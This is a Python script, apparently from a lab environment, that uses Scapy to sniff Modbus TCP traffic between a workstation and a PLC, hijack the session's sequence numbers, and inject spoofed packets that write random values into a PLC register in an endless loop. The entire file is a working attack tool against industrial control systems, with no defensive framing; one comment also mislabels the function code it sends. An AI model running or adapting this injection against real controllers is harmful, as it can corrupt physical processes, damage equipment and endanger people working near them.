import random
from scapy.all import *

Transaction_ID = 0
# Read holding register is the last query in loop
# Read holding register hex '00 00 00 06 01 03 00 01 00 02'
# Read discrete input is the first query in the loop
# Read discrete input hex '00 00 00 06 01 02 00 00 00 03'
attacker = "192.168.88.201"
workstation = "192.168.88.204"
plc = "192.168.88.10"
interface = "eth0"
MAC_PLC = "a6:83:e7:d3:3f:64"
MAC_WORKSTATION = "08:00:27:FF:CA:89"
MAC_ATTACKER = "08:00:27:88:85:88"
discrete_read_hex = "\\x00\\x00\\x00\\x06\\x01\\x02\\x00\\x00\\x00\\x03"
holding_read_hex = "\\x00\\x00\\x00\\x06\\x01\\x03\\x00\\x01\\x00\\x02"
while (True):
    flag = 1
    while flag:
        READ_DISCRETE = sniff(iface=interface, count=1,lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == plc and x[TCP].flags == "PA")[0]
        try:
            if discrete_read_hex in str(READ_DISCRETE[Raw].load):
                flag=0	
        except:
            flag=1

    Transaction_str = str(READ_DISCRETE[Raw].load.hex())[0:-20]
    Transaction_ID = int(Transaction_str,16) + 4

    # Modbus Layer Definition
    class ModbusTCP(Packet):
        name = "modbustcp"
        fields_desc = [ ShortField("Transaction Identifier", Transaction_ID), 
                        ShortField("Protocol Identifier", 0),
                        ShortField("Length", 6),
                        ByteField("Unit Identifier",0)
                        ]
                        
    #Modbus Write Multiple Coils                    
    class Modbus(Packet):
        name = "modbus"
        fields_desc = [ XByteField("Function Code", 6),   
                        ShortField("Reference Number", 1),
                        ShortField("Data", random.randint(0, 1000))
                        ]
    flag = 1
    while flag:
        READ_HOLDING = sniff(iface=interface, count=1,lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == plc and x[TCP].flags == "PA")[0]
        try:
            if holding_read_hex in str(READ_HOLDING[Raw].load):
                flag=0	
        except:
            flag=1

    ACK = sniff(iface=interface, count=1,lfilter=lambda x: x.haslayer(TCP) and x[IP].dst == plc and x[TCP].flags == "A")[0]

    data_mb = {
        'ipsrc': ACK[IP].src,
        'ipdst': ACK[IP].dst,
        'sport': ACK[TCP].sport,
        'dport': ACK[TCP].dport,
        'seq': ACK[TCP].seq,
        'ack': ACK[TCP].ack,
        'window' : ACK[TCP].window,
        'id' : ACK[IP].id,
        'flags' : ACK[IP].flags
        }

    PAYLOAD_MODBUS = Ether(src=MAC_ATTACKER, dst=MAC_PLC)/ \
                IP(src=workstation, dst=plc,ttl=128,id = data_mb['id'],flags=data_mb['flags']) / \
                TCP(sport=data_mb['sport'], dport=data_mb['dport'],
                flags="PA", window=1026, seq= data_mb['seq'], ack=data_mb['ack'])/ \
                ModbusTCP()/Modbus()

    sendp(PAYLOAD_MODBUS, verbose=0, iface=interface)

    print("---------------------------- PACKET INJECTED")

